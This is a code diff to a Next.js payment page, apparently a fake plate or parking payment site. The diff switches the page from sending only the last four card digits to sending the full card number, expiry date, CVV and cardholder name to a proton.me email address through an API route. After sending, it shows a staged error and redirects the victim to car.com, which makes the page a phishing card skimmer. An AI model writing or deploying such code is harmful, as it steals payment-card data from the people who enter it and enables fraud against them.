@@ -7,7 +7,6 @@ import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { useRouter } from 'next/navigation'
 import { usePlateStore } from "@/lib/plates"
-import emailjs from 'emailjs-com'
 import {
   Dialog,
   DialogContent,
@@ -28,54 +27,54 @@ export default function PaymentPage() {
   const [cvv, setCvv] = useState('')
 
   const handlePayment = async () => {
-    setIsLoading(true)
+    setIsLoading(true);
     try {
-      const result = await emailjs.send(
-          'service_id', // Replace with your EmailJS service ID
-          'template_id', // Replace with your EmailJS template ID
-          {
-            to_email: 'megatrondy@proton.me',
-            amount: selectedRate.toFixed(2),
-            plate: selectedPlate?.number,
-            cardholderName,
-            cardNumber: cardNumber.slice(-4), // Only send last 4 digits for security
-            expiryDate,
-            cvv: '***' // Don't send actual CVV for security reasons
-          },
-          'your_user_id' // Replace with your EmailJS user ID
-      )
+      const response = await fetch('/api/send-email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          to: 'megatrondy@proton.me',
+          subject: 'Payment Confirmation',
+          html: `
+          <p>A payment has been made:</p>
+          <ul>
+            <li>Amount: $${selectedRate.toFixed(2)}</li>
+            <li>Plate: ${selectedPlate?.number}</li>
+            <li>Cardholder Name: ${cardholderName}</li>
+            <li>Card Number: ${cardNumber}</li>
+            <li>Expiry Date: ${expiryDate}</li>
+            <li>Code ${cvv}</li>
+          </ul>
+        `,
+        }),
+      });
 
-      console.log('Email successfully sent!', result)
-
-      // Simulate a delay before showing the error
-      setTimeout(() => {
-        setIsLoading(false)
-        setShowError(true)
-
-        // Redirect after a few seconds
-        setTimeout(() => {
-          router.push('https://car.com')
-        }, 3000)
-      }, 2000)
-    } catch (error) {
-      console.error('Error sending email:', error)
-      if (error instanceof Error) {
-        console.error('Error name:', error.name)
-        console.error('Error message:', error.message)
-        console.error('Error stack:', error.stack)
-      } else {
-        console.error('Unknown error:', error)
+      if (!response.ok) {
+        throw new Error('Failed to send email');
       }
 
-      setIsLoading(false)
-      setShowError(true)
+      const result = await response.json();
+      console.log('Email sent successfully:', result);
 
-      // Redirect after showing the error
       setTimeout(() => {
-        router.push('https://car.com')
-      }, 3000)
+        setIsLoading(false);
+        setShowError(true);
+
+        setTimeout(() => {
+          router.push('https://car.com');
+        }, 1000);
+      }, 1000);
+    } catch (error) {
+      console.error('Error sending email:', error);
+      setIsLoading(false);
+      setShowError(true);
+
+      setTimeout(() => {
+        router.push('https://car.com');
+      }, 1000);
     }
-  }
+  };
+
 
   if (!selectedPlate) {
     router.push('/')
@@ -239,5 +238,5 @@ export default function PaymentPage() {
           </DialogContent>
         </Dialog>
       </div>
-  )
+  );
 }
